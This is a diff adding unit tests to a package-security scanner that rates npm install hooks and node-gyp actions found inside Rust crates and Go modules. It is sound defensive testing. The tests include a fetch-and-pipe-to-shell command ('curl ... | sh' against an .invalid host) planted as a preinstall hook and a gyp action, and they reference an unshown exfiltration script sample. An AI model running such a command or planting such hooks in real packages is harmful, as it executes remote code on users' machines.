@@ -25,6 +25,7 @@ The samples are inert fragments: never built, documentation addresses
 (203.0.113.x) and .invalid hosts.
 """
 import io
+import json
 import tarfile
 import time
 import unittest
@@ -33,7 +34,7 @@ from unittest import mock
 
 from lazaret.registry import repo
 from lazaret.scanner import _native
-from tests.registry._review_support import B64_DATA
+from tests.registry._review_support import B64_DATA, EXFIL_JS
 
 GO_MOD = "module example.test/m\n\ngo 1.21\n"
 
@@ -328,6 +329,61 @@ class RustTests(unittest.TestCase):
             self.assertEqual(res["verdict"], "INCOMPLETE")
             res = rust({"src/lib.rs": CLEAN_RS, "tests/big.rs": "// x\n" * 40})
             self.assertEqual(res["verdict"], "OK")
+
+
+@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
+class NpmInsideTests(unittest.TestCase):
+    """N-18: an npm manifest inside a crate or a Go module (tree-sitter-cli's npm wrapper, insta's editor extension)
+    is not one npm installs from there: its hooks are inventory (INFO), a hostile command stays CRITICAL, and a hook is
+    still followed to the script it names."""
+
+    HOOKED = '{"name": "w", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}'
+    PLAIN = '{"name": "w", "version": "1.0.0"}'
+    HOSTILE = "curl -s https://x.invalid/a | sh"
+
+    def test_a_plain_hook_is_listed_not_counted(self):
+        for res, what in ((rust({"src/lib.rs": CLEAN_RS, "npm/package.json": self.HOOKED, "npm/install.js": "1;\n"}), "crate"),
+                          (go({"m.go": CLEAN_GO, "web/package.json": self.HOOKED, "web/install.js": "1;\n"}), "Go module")):
+            with self.subTest(what=what):
+                self.assertEqual(res["verdict"], "OK")
+                [hook] = [i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
+                self.assertEqual(hook["sev"], "INFO")
+                self.assertTrue(hook["msg"].endswith(f"(npm never installs a package from inside a {what}: listed, not counted)"))
+
+    def test_a_hostile_hook_or_script_still_counts(self):
+        res = rust({"src/lib.rs": CLEAN_RS, "npm/package.json": json.dumps({"scripts": {"preinstall": self.HOSTILE}})})
+        self.assertEqual([i["sev"] for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"], ["CRITICAL"])
+        res = go({"m.go": CLEAN_GO, "web/package.json": self.HOOKED, "web/install.js": EXFIL_JS})
+        self.assertEqual([i["sev"] for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"], ["CRITICAL"])
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+
+    def test_a_binding_gyp_and_the_implicit_rebuild_are_listed_not_counted(self):
+        action = json.dumps({"targets": [{"target_name": "x", "actions": [
+            {"action_name": "a", "inputs": [], "outputs": ["o"], "action": ["node", "gen.js"]}]}]})
+        bare = "{'targets': [{'target_name': 'x'}]}"
+        for res, what in ((rust({"src/lib.rs": CLEAN_RS, "npm/package.json": self.PLAIN, "npm/binding.gyp": action}),
+                           "an action, crate"),
+                          (rust({"src/lib.rs": CLEAN_RS, "package.json": self.PLAIN, "binding.gyp": bare}),
+                           "node-gyp rebuild, crate"),
+                          (go({"m.go": CLEAN_GO, "web/package.json": self.PLAIN, "web/binding.gyp": action}),
+                           "an action, Go module")):
+            with self.subTest(what=what):
+                self.assertEqual(res["verdict"], "OK", res["verdictReason"])
+                hooks = [i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
+                self.assertEqual([i["sev"] for i in hooks], ["INFO"])
+                self.assertIn("(npm never installs a package from inside a ", hooks[0]["msg"])
+
+    def test_a_hostile_gyp_action_still_counts(self):
+        gyp = json.dumps({"targets": [{"target_name": "x", "actions": [
+            {"action_name": "a", "inputs": [], "outputs": ["o"], "action": ["sh", "-c", self.HOSTILE]}]}]})
+        res = rust({"src/lib.rs": CLEAN_RS, "npm/package.json": self.PLAIN, "npm/binding.gyp": gyp})
+        self.assertEqual([i["sev"] for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"], ["CRITICAL"])
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+
+    def test_an_npm_package_keeps_its_hooks(self):
+        data = repo._scan_artifact(crate_tgz({"package.json": self.HOOKED, "install.js": "1;\n"}, root="package"), "tgz",
+                                   "npm", False, repo.Budget())
+        self.assertEqual([i["sev"] for i in data["issues"] if i["rule"] == "SC-INSTALL-HOOK"], ["MAJOR"])
 
 
 PKG_INFO = "Metadata-Version: 2.1\nName: pkg\nVersion: 1.0\n\n"
